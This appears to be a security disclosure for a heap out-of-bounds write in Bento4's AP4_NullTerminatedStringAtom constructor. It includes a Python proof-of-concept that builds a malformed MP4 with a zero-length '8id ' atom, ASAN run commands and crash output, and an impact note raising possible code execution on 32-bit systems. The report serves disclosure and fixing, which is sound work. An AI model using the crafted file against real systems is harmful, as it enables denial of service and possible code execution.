## Bug0: Heap OOB Write in AP4_NullTerminatedStringAtom When Atom Size Equals Header Size

In `AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom` (Ap4Atom.cpp lines 470-473), when the atom `size` field equals `AP4_ATOM_HEADER_SIZE` (8), the unsigned subtraction `str_size = size - AP4_ATOM_HEADER_SIZE` produces zero and the subsequent `str[str_size-1]` expression wraps to `str[0xFFFFFFFF]`, writing a null byte approximately 4 GB past the heap allocation and causing an out-of-bounds write.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(type_str, payload=b""):
    size = 8 + len(payload)
    return struct.pack(">I", size) + type_str.encode("latin-1") + payload

# ftyp box
ftyp_payload = b"mp42" + struct.pack(">I", 0) + b"mp42"
ftyp = box("ftyp", ftyp_payload)

# Malicious 8id  atom: size=8 (header only), type="8id " (0x38 0x69 0x64 0x20)
# str_size = 8 - 8 = 0; str[0 - 1] = str[0xFFFFFFFF] => OOB write
malicious_atom = struct.pack(">I", 8) + b"8id "

# moov box containing the malicious atom
moov = box("moov", malicious_atom)

data = ftyp + moov

with open("poc_input.mp4", "wb") as f:
    f.write(data)

print(f"Written {len(data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: SEGV on unknown address 0x50210000008f (pc 0x557fa377dd94 bp 0x7ffcd5e85ce0 sp 0x7ffcd5e85ca0 T0)
The signal is caused by a WRITE memory access.
#0 0x557fa377dd94 in AP4_NullTerminatedStringAtom::AP4_NullTerminatedStringAtom(unsigned int, unsigned long long, AP4_ByteStream&)
#1 0x557fa3788292 in AP4_AtomFactory::CreateAtomFromStream(AP4_ByteStream&, unsigned int, unsigned int, unsigned long long, AP4_Atom*&)

### Impact

An attacker can trigger a reliable out-of-bounds write by supplying a crafted MP4 file containing an `8id ` atom whose size field equals 8, causing the process to crash with SIGSEGV on 64-bit systems and constituting a denial-of-service condition against any mp42aac invocation on untrusted input. On 32-bit systems the off-by-one write of `str[-1]` corrupts adjacent heap metadata, which with a controlled heap layout may be escalated to arbitrary code execution. No special privileges or interaction beyond providing the malicious file are required.
